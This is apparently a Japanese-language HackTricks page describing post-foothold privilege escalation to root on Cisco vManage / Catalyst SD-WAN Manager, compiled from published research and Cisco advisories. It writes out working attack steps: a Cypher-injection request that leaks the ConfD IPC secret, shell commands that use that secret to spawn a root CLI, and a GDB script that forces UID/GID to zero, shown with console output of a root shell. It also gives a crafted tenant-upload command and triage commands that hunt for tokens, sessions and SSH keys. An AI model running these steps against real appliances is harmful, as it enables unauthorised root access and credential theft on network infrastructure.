# Cisco - vmanage

Cisco vManage / *Catalyst SD-WAN Manager* で `vmanage`、`netadmin`、または `vmanage-admin` として code execution を取得した場合、最も興味深いローカル privesc の攻撃対象は通常、`confd` CLI stack、`cmdptywrapper` helper、localhost REST APIs、root 所有の import/upload handlers です。

controller 上でまだ **initial foothold** が必要な場合は、まず専用の control-plane ページを確認してください。

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
`/etc/confd/confd_ipc_secret` が foothold から読み取り可能であれば、Path 1 と Path 2 はすぐに実行可能になります。remote file disclosure または webshell 経由で侵入した場合は、`vmanage-admin` の SSH マテリアルと multitenancy の upload handler も調査してください。最近の研究では、いずれも有効な pivot として実証されています。<sup>[[3]](#references)[[4]](#references)</sup>

## Path 1

Synacktiv の vManage assessment では、この root shell への経路が文書化されています。<sup>[[5]](#references)</sup>

報告書からリンクされている [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) では IPC authentication について説明されており、vManage の例では secret が `/etc/confd/confd_ipc_secret` に配置され、`vmanage` から読み取り可能であることが示されています。<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
報告された構成では、Neo4j が `vmanage` 権限で実行されるため、先述の Cypher injection によって secret file を読み取れます。<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` 自体はコマンドライン引数を受け付けず、`/usr/bin/confd_cli_user` を呼び出します。報告された workflow では、この root-readable な helper を rootfs から抽出し、`scp` でコピーして help を読み取り、`CONFD_IPC_ACCESS_FILE` を設定したうえで、`-U 0 -G 0` を付けて呼び出し、root shell を取得します。<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Path 2

この代替ルートは、Walmart Global TechによるvManage 19.2.2の調査を基にしています。<sup>[[6]](#references)</sup>

Synacktivのpathでは、報告された環境でrootから読み取り可能な`/usr/bin/confd_cli_user`のコピーが必要です。一方、Walmartのレポートでは、GDBの下で`confd_cli`のidentity valuesを変更します。<sup>[[5]](#references)[[6]](#references)</sup>

レポートのdisassemblyでは、`confd_cli`がcallerのUIDとGIDを収集していることが示されています。<sup>[[6]](#references)</sup>

<details>
<summary>UID/GID collectionを示すObjdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
同じテストでは、root が所有する `cmdptywrapper` が明示的な `-g` および `-u` の値を受け取ることが示されました。<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
研究者は、`confd_cli` がログインユーザーの UID と GID を `cmdptywrapper` に転送していると推測しました。<sup>[[6]](#references)</sup>

`cmdptywrapper` を `-g 0 -u 0` で直接実行すると、必要なファイルディスクリプタ（例では `-i 1015`）が利用できなかったため失敗しました。<sup>[[6]](#references)</sup>

`confd_cli` はこれらの値を引数として公開していないため、レポートでは GDB を使用して `getuid()` と `getgid()` の戻り値を上書きしています。この appliance には GDB が存在していました。<sup>[[5]](#references)[[6]](#references)</sup>

`vmanage` access があれば、テストで `/etc/confd/confd_ipc_secret` を読み取ることができました。次の script は、両方の identity call の戻り値を 0 に強制します。<sup>[[6]](#references)</sup>

レポートで使用された GDB script は次のとおりです。<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
報告されたコンソール出力は次のとおりです。<sup>[[6]](#references)</sup>

<details>
<summary>コンソール出力</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco は後に、[CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) に関する独自の advisory で、より単純な local root path を公開しました。**read-only privileges しか持たない authenticated attacker** が、manager CLI に crafted request を送信し、不十分な input validation を悪用して root を取得できました。<sup>[[7]](#references)</sup>

offensive perspective では、この advisory と以前の CLI research から、次の workflow が考えられます。<sup>[[6]](#references)[[7]](#references)</sup>

1. box 上で *any* low-priv foothold を取得したら、より大がかりな Path 1 / Path 2 workflow に進む前に、local CLI service をテストする。
2. Path 2 の artifacts を再利用して、trust boundary を見つける: `confd_cli` → `cmdptywrapper` → `vshell`。
3. CLI backend に転送されるすべての field を suspicious とみなす: UID/GID、username、terminal metadata、imported files、または後に root-owned helper によって消費される任意の value。
4. low-priv user が local CLI socket に到達し、それらの field に影響を与えられる場合、root 取得は crafted request 1 つで可能になる場合がある。

appliance に侵入したら、次のように local CLI chain を調査します。<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
これは2025年のbugを再利用可能なhunting patternに変えるものです。つまり、**userlandでidentityを収集し、それをprivileged wrapperに転送する local CLI shim**を探します。<sup>[[6]](#references)[[7]](#references)</sup>

**CVE-2025-20122**を後発の**CVE-2026-20122**と混同しないでください。2025年の問題は*local*なCLI-to-root bugである一方、2026年の問題は*remote*なAPIによるarbitrary file overwriteであり、主にfootholdを仕込んだ後、Path 1 / Path 2 / Path 4を再調査するために利用できます。<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Ciscoの2026年2月のadvisoryでは、もう1つ有用なprivesc classである[CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)について説明されています。**authenticatedでlocalなlow-privileges attacker**は、REST APIのuser-authentication mechanismが不十分であるため、root権限を取得できる可能性があります。<sup>[[1]](#references)</sup>

これは、vManageのprivescがもはや`confd`/TTY abuseに限られないため重要です。low-priv shellを取得した後は、次の点も調査してください。<sup>[[1]](#references)</sup>

- callerを過度に信頼するlocalhost-only API endpoints
- current accountから読み取り可能なtokens、cookies、またはservice credentials
- localからtrigger可能な`dataservice`/REST handlersを通じて公開されているroot-only actions

実際には、`vmanage`または別のservice userとしてshellを取得したら、local API abuseのほうがinteractive CLI abuseより自動化しやすい場合があります。<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
ローカルのsession contextだけでprivileged REST functionalityにアクセスできる場合は、API pathを優先してください。盗まれたweb sessionやAPI tokenと容易にreplay、script化、chain化できるためです。<sup>[[1]](#references)</sup>

## Path 5（2026年に作成されたfileをrootが処理 - CVE-2026-20245）

もう1つの最近のパターンは[CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)です。`netadmin` privilegesを持つlocal attackerは**crafted file**をuploadでき、後からCLIがそれをunsafeに処理することで、`root`としてcommand injectionにつながる可能性がありました。<sup>[[2]](#references)</sup>

HackTricksの観点では、価値のあるtechniqueは特定のCVEよりも広いものです。<sup>[[2]](#references)</sup>

1. fileを受け付けるすべてのCLIまたはweb workflowを列挙します。imports、diagnostic bundles、templates、validators、backups、tenant dataなどが含まれます。
2. uploadされたfileがどこに配置され、どのroot-owned scriptまたはbinaryがそれを消費するのかを追跡します。
3. filename、file content、またはparsed metadataが、shell commands、wrapper scripts、`system()`-style helpersに渡されることがあるかをテストします。
4. すでに`netadmin`に到達できる場合（有効なcreds、盗まれたsession、またはauth-bypass chain）、file-processing bugsはrootへの最短経路になることが多くあります。

その後、Google Cloud / Mandiantは、このbug classがmultitenancy import pathを通じてexploitされた具体例を示しました。<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
観測された攻撃では、細工された CSV によって `/etc/passwd` と `/etc/shadow` が変更され、一時的な UID 0 アカウント（`troot`）が作成されました。これにより、`tenant-upload` / `tenant-list` 型の importer は特に興味深い対象となります。これらは単なるデータ取り込み機能ではなく、root 所有の parser フロントエンドとなる可能性があるためです。<sup>[[4]](#references)</sup>

shell 側で素早く調査するパターンは次のとおりです。
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
このバグクラスは、`root` ではなく `netadmin` を付与する remote foothold と特にうまく chain できます。<sup>[[2]](#references)[[4]](#references)</sup>

## vManage/Catalyst SD-WAN Manager のその他の最近の脆弱性（chain 対象）

- **未認証の info leak（CVE-2026-20133）** – 公開された research により、`confd_ipc_secret` または `vmanage-admin` の private key を露出させられることが示されており、read bug を Path 1 または NETCONF pivot に変えられるため、特に価値が高い脆弱性です。<sup>[[3]](#references)</sup>
- **認証済み API による任意ファイル overwrite（CVE-2026-20122）** – 上記の 2025 CLI bug とは異なります。VulnCheck はこれを利用して webshell を upload しており、その結果、このページの local privesc paths が直ちに関連するようになります。<sup>[[3]](#references)</sup>
- **認証済み UI XSS（CVE-2024-20475）** – 認証済み attacker は、影響を受ける user の web interface 上で script を execute できます。その結果得られる session context に、`vshell` または上記の local privesc paths に到達する API/CLI actions が露出するかを assess してください。<sup>[[9]](#references)</sup>
- **remote auth bypass による `netadmin` 取得（CVE-2026-20129）** – `netadmin` は 2026 crafted-file privesc に必要なレベルそのものであるため、Path 5 の非常に強力な precursor です。<sup>[[2]](#references)[[3]](#references)</sup>
- **認証済みの任意ファイル write（CVE-2026-20262）** – CVE-2026-20122 と同様の offensive value を持ちますが、より後段の web UI upload path を通じて実行されます。Cisco によると、この bug によって作成または overwrite された file は、後から root への elevate に利用できます。<sup>[[10]](#references)</sup>
- **downgrade による古い CLI privesc の復活（CVE-2022-20775）** – 2026 年の intrusions では、attackers が古い vulnerable SD-WAN build に rollback し、旧 CLI root bug を abuse した後、元の version に restore できることが示されました。<sup>[[8]](#references)</sup>
- **pre-auth control-plane auth bypass（CVE-2026-20182）** – 詳細は専用の SD-WAN control-plane page で説明されています。これは `vmanage-admin` の SSH key を append でき、後続の management-plane actions 用に永続的な NETCONF access を提供します。<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN の脆弱性（CVE-2026-20126、CVE-2026-20129 など）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller、Catalyst SD-WAN Manager、Catalyst SD-WAN Validator の認証済み権限昇格の脆弱性（CVE-2026-20245）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - 最近の Cisco SD-WAN Manager の脆弱性](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager の脆弱性（CVE-2026-20245）に対する Zero-Day Exploitation](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Cisco SD-WAN の Pentesting Part 1: vManage への Attacking](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — CSRF から Remote Code Execution まで](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager の権限昇格の脆弱性（CVE-2025-20122）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 による Cisco Catalyst SD-WAN の Active exploitation（Cisco Talos）](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager の Cross-Site Scripting の脆弱性（CVE-2024-20475）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager の任意ファイル write の脆弱性（CVE-2026-20262）](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Cisco Catalyst SD-WAN Controller の Critical authentication bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
